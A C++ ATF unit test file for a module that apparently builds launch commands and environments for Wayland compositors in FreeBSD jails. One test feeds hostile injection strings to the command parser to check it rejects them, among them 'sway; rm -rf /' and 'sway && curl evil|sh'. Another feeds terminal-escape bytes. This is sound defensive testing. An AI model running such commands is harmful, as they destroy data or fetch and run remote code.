// Copyright (C) 2026 by Vladyslav V. Prodan <github.com/click0>. All rights reserved.

#include "compositor_pure.h"

#include <atf-c++.hpp>

#include <algorithm>
#include <string>
#include <vector>

using CompositorPure::Backend;
using CompositorPure::backendName;
using CompositorPure::composeEnv;
using CompositorPure::defaultWaylandSocket;
using CompositorPure::needsSeatd;
using CompositorPure::parseBackend;
using CompositorPure::parseCompositorCommand;
using CompositorPure::requiredDevfsUnhide;
using CompositorPure::seatdSocketCandidates;
using CompositorPure::wayvncArgs;

namespace {

bool envHas(const std::vector<std::pair<std::string, std::string>> &env,
            const std::string &key, const std::string &val) {
  for (const auto &kv : env)
    if (kv.first == key)
      return kv.second == val;
  return false;
}

bool envHasKey(const std::vector<std::pair<std::string, std::string>> &env,
               const std::string &key) {
  for (const auto &kv : env)
    if (kv.first == key)
      return true;
  return false;
}

bool listHas(const std::vector<std::string> &v, const std::string &s) {
  return std::find(v.begin(), v.end(), s) != v.end();
}

} // namespace

// --- parseBackend / backendName ---

ATF_TEST_CASE_WITHOUT_HEAD(backend_parse_defaults_and_known);
ATF_TEST_CASE_BODY(backend_parse_defaults_and_known) {
  Backend b;
  ATF_REQUIRE(parseBackend("", b));         ATF_REQUIRE(b == Backend::Headless);
  ATF_REQUIRE(parseBackend("headless", b)); ATF_REQUIRE(b == Backend::Headless);
  ATF_REQUIRE(parseBackend("drm", b));      ATF_REQUIRE(b == Backend::Drm);
}

ATF_TEST_CASE_WITHOUT_HEAD(backend_parse_rejects_unknown_and_case);
ATF_TEST_CASE_BODY(backend_parse_rejects_unknown_and_case) {
  Backend b;
  ATF_REQUIRE(!parseBackend("x11", b));
  ATF_REQUIRE(!parseBackend("DRM", b));       // case-sensitive
  ATF_REQUIRE(!parseBackend("Headless", b));
  ATF_REQUIRE(!parseBackend("gpu", b));
}

ATF_TEST_CASE_WITHOUT_HEAD(backend_name_roundtrips);
ATF_TEST_CASE_BODY(backend_name_roundtrips) {
  ATF_REQUIRE(std::string(backendName(Backend::Headless)) == "headless");
  ATF_REQUIRE(std::string(backendName(Backend::Drm)) == "drm");
}

// --- parseCompositorCommand ---

ATF_TEST_CASE_WITHOUT_HEAD(cmd_single_token);
ATF_TEST_CASE_BODY(cmd_single_token) {
  std::vector<std::string> argv; std::string err;
  ATF_REQUIRE(parseCompositorCommand("sway", argv, err));
  ATF_REQUIRE_EQ(1u, argv.size());
  ATF_REQUIRE_EQ("sway", argv[0]);
  ATF_REQUIRE(err.empty());
}

ATF_TEST_CASE_WITHOUT_HEAD(cmd_multi_token_and_whitespace);
ATF_TEST_CASE_BODY(cmd_multi_token_and_whitespace) {
  std::vector<std::string> argv; std::string err;
  ATF_REQUIRE(parseCompositorCommand("  cage   firefox  ", argv, err));
  ATF_REQUIRE_EQ(2u, argv.size());
  ATF_REQUIRE_EQ("cage", argv[0]);
  ATF_REQUIRE_EQ("firefox", argv[1]);

  argv.clear(); err.clear();
  ATF_REQUIRE(parseCompositorCommand("sway\t-d", argv, err));   // tab separates
  ATF_REQUIRE_EQ(2u, argv.size());
  ATF_REQUIRE_EQ("sway", argv[0]);
  ATF_REQUIRE_EQ("-d", argv[1]);

  argv.clear(); err.clear();
  ATF_REQUIRE(parseCompositorCommand("/usr/local/bin/sway --config /etc/sway", argv, err));
  ATF_REQUIRE_EQ(3u, argv.size());
  ATF_REQUIRE_EQ("/usr/local/bin/sway", argv[0]);
}

ATF_TEST_CASE_WITHOUT_HEAD(cmd_empty_or_blank_rejected);
ATF_TEST_CASE_BODY(cmd_empty_or_blank_rejected) {
  std::vector<std::string> argv; std::string err;
  ATF_REQUIRE(!parseCompositorCommand("", argv, err));
  ATF_REQUIRE(!err.empty());
  ATF_REQUIRE(argv.empty());

  err.clear();
  ATF_REQUIRE(!parseCompositorCommand("   \t  ", argv, err));
  ATF_REQUIRE(!err.empty());
  ATF_REQUIRE(argv.empty());
}

ATF_TEST_CASE_WITHOUT_HEAD(cmd_shell_metacharacters_rejected);
ATF_TEST_CASE_BODY(cmd_shell_metacharacters_rejected) {
  std::vector<std::string> argv; std::string err;
  // Each of these must fail closed (no partial argv leaks out).
  for (const char *bad : {
         "sway; rm -rf /",
         "sway && curl evil|sh",
         "foo | bar",
         "$(reboot)",
         "x`whoami`",
         "ls > /etc/passwd",
         "glob*",
         "a&b",
         "cmd\ninjected",
       }) {
    argv = {"stale"}; err.clear();
    ATF_REQUIRE(!parseCompositorCommand(bad, argv, err));
    ATF_REQUIRE(!err.empty());
    ATF_REQUIRE(argv.empty());
  }
}

ATF_TEST_CASE_WITHOUT_HEAD(cmd_control_characters_rejected);
ATF_TEST_CASE_BODY(cmd_control_characters_rejected) {
  std::vector<std::string> argv; std::string err;
  // Control bytes must not survive into argv (terminal-escape injection
  // when the command is echoed to logs / ps). ESC, BS, DEL, NUL, and a
  // C1-ish low byte. Each must fail closed.
  const std::string bad[] = {
    std::string("sway\x1b[2J"),                 // ESC
    std::string("sway\x1b]0;pwned\x07"),         // ESC OSC + BEL
    std::string("sway\bfoo"),                    // backspace
    std::string("sway\x7f"),                     // DEL
    std::string("sway\x01"),                     // SOH
    std::string("good\x1b" "bad"),               // valid token before the ESC (split: \x is greedy)
  };
  for (const auto &b : bad) {
    argv = {"stale"}; err.clear();
    ATF_REQUIRE(!parseCompositorCommand(b, argv, err));
    ATF_REQUIRE(!err.empty());
    ATF_REQUIRE(argv.empty());          // fail-closed even after a good token
  }
}

ATF_TEST_CASE_WITHOUT_HEAD(cmd_lone_metachar_token_fails_closed);
ATF_TEST_CASE_BODY(cmd_lone_metachar_token_fails_closed) {
  std::vector<std::string> argv; std::string err;
  // A good token already pushed, then a bare metacharacter token: argv
  // must be cleared, not left holding {"sway"}.
  argv = {"stale"}; err.clear();
  ATF_REQUIRE(!parseCompositorCommand("sway ; rm", argv, err));
  ATF_REQUIRE(argv.empty());
  // Leading/trailing dashes are ordinary tokens, not flags to reject.
  argv.clear(); err.clear();
  ATF_REQUIRE(parseCompositorCommand("sway -- --unsupported-gpu", argv, err));
  ATF_REQUIRE_EQ(3u, argv.size());
  ATF_REQUIRE_EQ("--", argv[1]);
}

// --- requiredDevfsUnhide ---

ATF_TEST_CASE_WITHOUT_HEAD(devfs_headless_software_needs_nothing);
ATF_TEST_CASE_BODY(devfs_headless_software_needs_nothing) {
  auto p = requiredDevfsUnhide(Backend::Headless, /*gpuAccel=*/false);
  ATF_REQUIRE(p.empty());
}

ATF_TEST_CASE_WITHOUT_HEAD(devfs_headless_gpu_needs_dri_only);
ATF_TEST_CASE_BODY(devfs_headless_gpu_needs_dri_only) {
  auto p = requiredDevfsUnhide(Backend::Headless, /*gpuAccel=*/true);
  ATF_REQUIRE(listHas(p, "dri"));
  ATF_REQUIRE(listHas(p, "dri/*"));
  ATF_REQUIRE(!listHas(p, "input/*"));   // headless never grabs input
}

ATF_TEST_CASE_WITHOUT_HEAD(devfs_drm_needs_dri_and_input);
ATF_TEST_CASE_BODY(devfs_drm_needs_dri_and_input) {
  // gpuAccel flag is irrelevant for drm (always GPU-backed).
  for (bool gpu : {false, true}) {
    auto p = requiredDevfsUnhide(Backend::Drm, gpu);
    ATF_REQUIRE(listHas(p, "dri"));
    ATF_REQUIRE(listHas(p, "dri/*"));
    ATF_REQUIRE(listHas(p, "input/*"));
  }
}

// --- needsSeatd / seatdSocketCandidates ---

ATF_TEST_CASE_WITHOUT_HEAD(seatd_needed_only_for_drm);
ATF_TEST_CASE_BODY(seatd_needed_only_for_drm) {
  ATF_REQUIRE(!needsSeatd(Backend::Headless));
  ATF_REQUIRE(needsSeatd(Backend::Drm));
}

ATF_TEST_CASE_WITHOUT_HEAD(seatd_candidates_include_freebsd_default);
ATF_TEST_CASE_BODY(seatd_candidates_include_freebsd_default) {
  auto c = seatdSocketCandidates();
  ATF_REQUIRE(!c.empty());
  ATF_REQUIRE_EQ("/var/run/seatd.sock", c[0]);   // most-conventional first
}

// --- composeEnv ---

ATF_TEST_CASE_WITHOUT_HEAD(env_headless_software_renderer);
ATF_TEST_CASE_BODY(env_headless_software_renderer) {
  auto e = composeEnv(Backend::Headless, "/tmp/wayland", "", /*gpuAccel=*/false);
  ATF_REQUIRE(envHas(e, "XDG_RUNTIME_DIR", "/tmp/wayland"));
  ATF_REQUIRE(envHas(e, "WLR_BACKEND", "headless"));
  ATF_REQUIRE(envHas(e, "WLR_RENDERER", "pixman"));
  ATF_REQUIRE(envHas(e, "WLR_HEADLESS_OUTPUTS", "1"));
  ATF_REQUIRE(envHas(e, "WLR_LIBINPUT_NO_DEVICES", "1"));
  // No seat plumbing for headless.
  ATF_REQUIRE(!envHasKey(e, "LIBSEAT_BACKEND"));
  ATF_REQUIRE(!envHasKey(e, "SEATD_SOCK"));
}

ATF_TEST_CASE_WITHOUT_HEAD(env_headless_gpu_renderer);
ATF_TEST_CASE_BODY(env_headless_gpu_renderer) {
  auto e = composeEnv(Backend::Headless, "/tmp/wayland", "", /*gpuAccel=*/true);
  ATF_REQUIRE(envHas(e, "WLR_BACKEND", "headless"));
  ATF_REQUIRE(envHas(e, "WLR_RENDERER", "gles2"));
  // GPU accel must NOT drop the headless-only knobs — without
  // WLR_LIBINPUT_NO_DEVICES wlroots probes libinput and needs
  // /dev/input, which the headless backend deliberately never unhides.
  ATF_REQUIRE(envHas(e, "WLR_HEADLESS_OUTPUTS", "1"));
  ATF_REQUIRE(envHas(e, "WLR_LIBINPUT_NO_DEVICES", "1"));
}

ATF_TEST_CASE_WITHOUT_HEAD(env_drm_with_seatd_socket);
ATF_TEST_CASE_BODY(env_drm_with_seatd_socket) {
  auto e = composeEnv(Backend::Drm, "/tmp/wayland", "/var/run/seatd.sock", true);
  ATF_REQUIRE(envHas(e, "XDG_RUNTIME_DIR", "/tmp/wayland"));
  ATF_REQUIRE(envHas(e, "WLR_BACKEND", "drm"));
  ATF_REQUIRE(envHas(e, "WLR_RENDERER", "gles2"));
  ATF_REQUIRE(envHas(e, "LIBSEAT_BACKEND", "seatd"));
  ATF_REQUIRE(envHas(e, "SEATD_SOCK", "/var/run/seatd.sock"));
}

ATF_TEST_CASE_WITHOUT_HEAD(env_drm_without_seatd_socket_omits_seat_vars);
ATF_TEST_CASE_BODY(env_drm_without_seatd_socket_omits_seat_vars) {
  // seatd not found on host -> we still launch (operator may run seatd
  // in the jail), but we don't point libseat at a non-existent socket.
  auto e = composeEnv(Backend::Drm, "/tmp/wayland", "", true);
  ATF_REQUIRE(envHas(e, "WLR_BACKEND", "drm"));
  ATF_REQUIRE(!envHasKey(e, "LIBSEAT_BACKEND"));
  ATF_REQUIRE(!envHasKey(e, "SEATD_SOCK"));
}

// --- wayvncArgs / defaultWaylandSocket ---

ATF_TEST_CASE_WITHOUT_HEAD(wayvnc_args_shape);
ATF_TEST_CASE_BODY(wayvnc_args_shape) {
  auto a = wayvncArgs("0.0.0.0", 5900);
  ATF_REQUIRE_EQ(2u, a.size());
  ATF_REQUIRE_EQ("0.0.0.0", a[0]);
  ATF_REQUIRE_EQ("5900", a[1]);
}

ATF_TEST_CASE_WITHOUT_HEAD(default_wayland_socket_is_zero);
ATF_TEST_CASE_BODY(default_wayland_socket_is_zero) {
  ATF_REQUIRE(std::string(defaultWaylandSocket()) == "wayland-0");
}

ATF_INIT_TEST_CASES(tcs) {
  ATF_ADD_TEST_CASE(tcs, backend_parse_defaults_and_known);
  ATF_ADD_TEST_CASE(tcs, backend_parse_rejects_unknown_and_case);
  ATF_ADD_TEST_CASE(tcs, backend_name_roundtrips);
  ATF_ADD_TEST_CASE(tcs, cmd_single_token);
  ATF_ADD_TEST_CASE(tcs, cmd_multi_token_and_whitespace);
  ATF_ADD_TEST_CASE(tcs, cmd_empty_or_blank_rejected);
  ATF_ADD_TEST_CASE(tcs, cmd_shell_metacharacters_rejected);
  ATF_ADD_TEST_CASE(tcs, cmd_control_characters_rejected);
  ATF_ADD_TEST_CASE(tcs, cmd_lone_metachar_token_fails_closed);
  ATF_ADD_TEST_CASE(tcs, devfs_headless_software_needs_nothing);
  ATF_ADD_TEST_CASE(tcs, devfs_headless_gpu_needs_dri_only);
  ATF_ADD_TEST_CASE(tcs, devfs_drm_needs_dri_and_input);
  ATF_ADD_TEST_CASE(tcs, seatd_needed_only_for_drm);
  ATF_ADD_TEST_CASE(tcs, seatd_candidates_include_freebsd_default);
  ATF_ADD_TEST_CASE(tcs, env_headless_software_renderer);
  ATF_ADD_TEST_CASE(tcs, env_headless_gpu_renderer);
  ATF_ADD_TEST_CASE(tcs, env_drm_with_seatd_socket);
  ATF_ADD_TEST_CASE(tcs, env_drm_without_seatd_socket_omits_seat_vars);
  ATF_ADD_TEST_CASE(tcs, wayvnc_args_shape);
  ATF_ADD_TEST_CASE(tcs, default_wayland_socket_is_zero);
}
